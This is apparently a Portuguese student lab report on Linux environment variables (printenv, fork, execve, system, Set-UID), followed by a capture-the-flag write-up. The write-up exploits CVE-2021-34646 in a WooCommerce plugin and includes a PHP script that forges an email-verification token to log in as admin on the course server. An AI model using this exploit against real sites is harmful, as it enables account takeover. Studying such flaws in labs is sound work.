# Trabalho realizado na Semana #4

## Tarefas realizadas

### #1
 
 
#### Printenv() 

* Nesta primeira tarefa o nosso objetivo passa por alterar as variáveis de ambiente com uso de Bash.

![](https://i.imgur.com/SpHoaH7.png)

<p>
    Fig.1- Output do printenv PWD.
</p>

* O comando "printenv" permite apenas imprimir o valor de ambiente. Neste caso irá imprimir o valor da variável PWD.

#### Env()

![](https://i.imgur.com/JlCjEJz.png)


<p>
    Fig.2- Output do env | grep PWD.
</p>


 
* Agora utilizamos o comando "env" poderemos ver que em ambos os exemplos fornecem o valor de ambiente PWD,mas o comando o "printenv" permite apenas imprimir os valores de ambiente, o comando "env" permite também imprimir os valores de ambiente mas consegue remover variáveis do ambiente. Este comando "env" poderá ser perigoso para o normal funcionamento do computador e poderá trazer mais vulnerabilidades ao mesmo.


#### Export()

 * O comando export irá exportar uma variável do ambiente para processos filhos

![](https://i.imgur.com/u6XqS85.png)

<p>
    Fig.3- Excerto do output do export.
</p>

* O output deste comando irá mostrar todas as variáveis exportadas.

#### Unset()

* A funcionalidade do unset é simples passa por apagar as variáveis de ambiente que desejamos apagar.

![](https://i.imgur.com/mMC6lVh.png)

<p>
    Fig.4- Exemplo como poderemos utilizar o unset.
</p>


* Neste exemplo poderemos ver que antes de utilizar o comando unset tinhamos Fruta=laranja depois de usarmos o unset deixou de existir Fruta=laranja.Este comando Unset poderá ser extremamente perigoso para funcionalidade do nosso computador se for usada de uma forma imprudente.



### #2

* O objetivo deste exercício é explorar o efeito da sucessão das variáveis de ambiente de um processo-pai para um processo-filho.

* Para criar um processo-filho, basta usarmos o comando ```fork()``` no processo-pai. Este comando gera um processo duplicado do processo-pai. O processo-filho herda o conteúdo do pai. Contudo, não herda algumas características do processo-pai, nomeadamente os mapeamentos de memória nem notificações de mudança de diretório.

* Para realizar esta tarefa, era necessário compilar e executar o ficheiro myprintenv.c:

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
extern char **environ;
void printenv()
{
    int i = 0;
    while (environ[i] != NULL) {
        printf("%s\n", environ[i]);
        i++;
    }
}

void main()
{
    pid_t childPid;
    switch(childPid = fork()) {
        case 0: /* child process */
        printenv(); ➀
        exit(0);
    default: /* parent process */
        //printenv(); ➁
        exit(0);
    }
}
    
```

* O output são todas as variáveis de ambiente do processo-filho:

![](https://i.imgur.com/zhVfOz6.png)

<p>
    Fig.5- Excerto de algumas varáveis de ambiente do processo-filho, dando destaque ao INVOCATION_ID e ao MANAGERPID.
</p>


* De seguida, bastava trocar o ```printenv()``` para o processo-pai e comparar os outputs das 2 execuções.

![](https://i.imgur.com/wbkn9R3.png)

<p>
    Fig.6- Excerto de algumas varáveis de ambiente do processo-pai. Note-se que o INVOCATION_ID e o MANAGERPID são os mesmos.
</p>

* Após executar o comando ```diff``` com os 2 ficheiros de output como argumentos, não aparece nada no terminal- significa que os ficheiros são os mesmos.

![](https://i.imgur.com/TK8UVCB.png)

<p>
    Fig.7- Output do diff.
</p>

* Assim, é possível concluir que um processo-filho herda as variáveis de ambiente do processo-pai. Isto é interessante (e perigoso) pois é possível que o processo-filho altere as variáveis de ambiente do processo-pai, compremetendo o comportamento normal deste último.


### #3

#### Step1

* Neste exercício iremos ver como as variáveis de ambiente são afetadas quando um novo programa está correr pela a  execve(). Esta função vai executar o programa e irá substituir o processo atual por um novo processo. Nesta tarefa iremos usar um ficheiro do tipo c "myenv.c" para ver como esta função funciona.


  **myenv.c**
```c  
  #include <unistd.h>
extern char **environ;
int main()
{
char *argv[2];
argv[0] = "/usr/bin/env";
argv[1] = NULL;
execve("/usr/bin/env", argv, NULL); 
return 0;
}
```

![](https://i.imgur.com/Ln4LtjQ.png)


<p>
    Fig.8- Output do myenv.c.
</p>

* Neste exemplo fornecemos um caminho binário para o programa que queremos correr que é usado como argumento constante "/usr/bi/env". O segudo argumento é NULL que corresponde ao array de argumentos que é preciso correr esse mesmo programa.O terceiro argumento também será NULL que seria o ambiente do processo. Por essa razão, o output é inexistente devido ao facto do terceiro argumento ser NULL. Se por algum motivo ocorrer algum erro ao utilizar esta função, irá retornar o valor -1.


#### Step2

```c
#include <unistd.h>
extern char **environ;
int main()
{
char *argv[2];
argv[0] = "/usr/bin/env";
argv[1] = NULL;
execve("/usr/bin/env", argv, environ);
return 0 ;
}
```
![](https://i.imgur.com/i1Rwway.png)

<P>
    Fig.9.Excerto do output do "myenv.c"
</P>

* Neste caso, como o terceiro argumento não é NULL, a função de ```execve()``` irá substituir o processo atual por outro uma lista de variáveis de ambiente chamada "environ". 

### Step3

* No passo 1 a função ```execve()``` cria um novo processo para correr o programa mas não transfere as variáveis de ambiente pelo o motivo de a lista ser NULL no 3º argumento. No passo 2 a lista das variáveis de ambiente já não é nula, logo a função irá passar uma lista de variáveis de ambiente de um processo para outro.

### #4

* O objetivo desta tarefa era perceber a relação entre as variáveis de ambiente e o comando ```system()```. Este comando, permite que um programa consiga abrir a shell (terminal do SO) para executar um comando definido pelo parâmetro de input.

* Para realizar esta tarefa, era necessário compilar e executar o ficheiro o seguinte ficheiro:

```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    system("/usr/bin/env");
    return 0 ;
}
```

* Se analisarmos o funcionamento do ```system``` este cria um processo-filho na qual executa o comando na shell que foi especificado como input através do ```execl```. Neste caso, espera-se que a shell execute o comando "user/bin/env" e que mostre as variáveis de ambiente do processo.


![](https://i.imgur.com/Kgd9IC6.png)

<p>
    Fig.9- Output do comando "man system", que mostra uma breve descrição do funcionamento deste comando.
</p>


* O output da execução é este. 

![](https://i.imgur.com/q6hmYox.png)

<p>
    Fig.10-Excerto do output. É possível ver algumas das variáveis de ambiente.
</p>

* Assim, é possível confirmar que o ```system()``` envia as variáveis de ambiente ao programa ```/bin/sh```. Isto pode ser perigoso se um atacante, ao conseguir injetar eficazmente código malicioso, pode executar também este excerto de código para aceder às variáveis de ambiente e modificá-las, alterando o comportamento normal dos programas.

### #5

O objetivo desta tarefa foi rodar um programa Set-UID que imprime ao terminal todas as variáveis de ambiente que ele tem acesso com utilizadores diferentes.

Um programa Set-UID assume os privilegios do utilizador a quem pertence o programa. Isso pode criar problemas de segurança pois um utilizador pode utilizar esse programa para escalar os seus privilegios

é dado ao programa privilégios de um utilizador root e as seguintes permissões:

|       |Owner Rights|Group Rights|Other Rights
|-------|------------|------------|-------
|Read   |true        |true        |true
|Write  |true        |false       |false
|Execute|true        |true        |true

Se forem adicionadas variáveis de ambiente ao um utilizador sem privilégios root e o código for executado pelo mesmo utilizador essas variáveis de ambiente serão imprimidas ao terminal.

Isso implica que o programa Set-UID tem acesso as variáveis de ambiente do utlizador que o executou. Sendo que o utilzador pode alterar o comportamento de programas que dependem das variaveis de ambiente.



### #6

 Nesta tarefa pede-se para verificar se há alguma vunerabilidade em utilizar a função system() para executar comandos no bash. 
 A função system executa uma outra função antes de iniciar que deteta se está a ser executado por um programa Set-UID e muda para os privilégios do utilizador atual para prevenir que a função utilize privilégios que não deveria ter.
 


---

## CTF

### Resolução

* Procuramos por CVE's associados aos plug-ins do site a atacar e encontramos o CVE-2021-34646, uma vulnerabilidade Booster for WooCommerce plugin 5.4.3.

![](https://i.imgur.com/FkSPmsx.png)


<p>
    Fig. CTF1- Plug-ins suscetíveis a vulnerabilidades.
</p>


* Após explorar a vulnerabilidade, percebemos que era fácil iniciar uma sessão como admin, bastando acrescentar no URL userID a 1, que é o ID típico para administradores.

![](https://i.imgur.com/aXAnynh.png)


<p>
    Fig. CTF2- Iniciar sessão com sucesso como admin.
</p>

* Para além disso,era necessário gerar um token de verificação de e-mail a partir do tempo de sessão como admin. Este token estava encriptado em MD5 e codificado em base 64. Por isso, era fácil gerar este token: bastava usar a função de PHP ```time()``` para obter o tempo até ao execução da sessão, gerar o token com as funções ```md5()``` e ```base64_encode()``` e inseri-lo no URL. Para isso, criámos um servidor local para correr o seguinte ficheiro PHP:

```php
<?php

$time = md5(time()); //tempo até ao momento codificado em MD5


fopen('http://ctf-fsi.fe.up.pt:5001/?wcj_user_id=1','r'); //inserir o ID do amdin


//criar token em base-64
$abc = base64_encode(json_encode(array('id' => 1, 'code' => $time)));


//inserir token no URL
header("Location: http://ctf-fsi.fe.up.pt:5001/?wcj_verify_email=" . $abc);
exit();

?>
```

![](https://i.imgur.com/SL7B3tM.png)

<p>
    Fig. CTF3- Acesso ao site como admin.
</p>

* Com a sessão iniciada como admin, foi possível aceder ao site http://ctf-fsi.fe.up.pt:5001/wp-admin/edit.php para encontrar o post que continha a flag do desafio.
